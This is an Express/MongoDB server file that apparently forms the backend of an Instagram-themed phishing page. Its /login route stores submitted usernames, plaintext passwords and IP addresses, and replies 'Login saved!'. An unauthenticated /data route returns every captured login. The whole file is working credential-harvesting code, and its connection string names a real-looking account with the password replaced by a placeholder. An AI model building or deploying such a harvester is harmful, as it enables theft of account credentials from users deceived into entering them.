const express = require("express");
const mongoose = require("mongoose");
const path = require("path");
const cors = require("cors");

const app = express();
const PORT = process.env.PORT || 3000;

// MongoDB connection string — replace YOUR_PASSWORD_HERE with your real password
const MONGO_URI =
  "mongodb+srv://pavank01437:YOUR_PASSWORD_HERE@instagram-login.vbztrin.mongodb.net/instagram?appName=Instagram-login";

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "public")));

// Login Schema
const loginSchema = new mongoose.Schema({
  username: { type: String, required: true },
  password: { type: String, required: true },
  timestamp: { type: Date, default: Date.now },
  ip: { type: String },
});

const Login = mongoose.model("Login", loginSchema);

// Connect to MongoDB
mongoose
  .connect(MONGO_URI)
  .then(() => console.log("✅ Connected to MongoDB Atlas"))
  .catch((err) => console.error("❌ MongoDB connection error:", err));

// Serve login page
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// Save login data
app.post("/login", async (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) {
    return res
      .status(400)
      .json({ success: false, message: "All fields required." });
  }

  try {
    const newLogin = new Login({
      username: username.trim(),
      password: password,
      ip: req.ip || "unknown",
    });

    await newLogin.save();
    console.log(`✅ Saved — User: ${username}`);
    return res.json({ success: true, message: "Login saved!" });
  } catch (err) {
    console.error("Save error:", err);
    return res.status(500).json({ success: false, message: "Server error." });
  }
});

// View all saved logins
app.get("/data", async (req, res) => {
  try {
    const logins = await Login.find().sort({ timestamp: -1 });
    res.json({ total: logins.length, logins });
  } catch (err) {
    res.status(500).json({ error: "Failed to fetch data." });
  }
});

app.listen(PORT, () => {
  console.log(`🚀 Server running at http://localhost:${PORT}`);
});
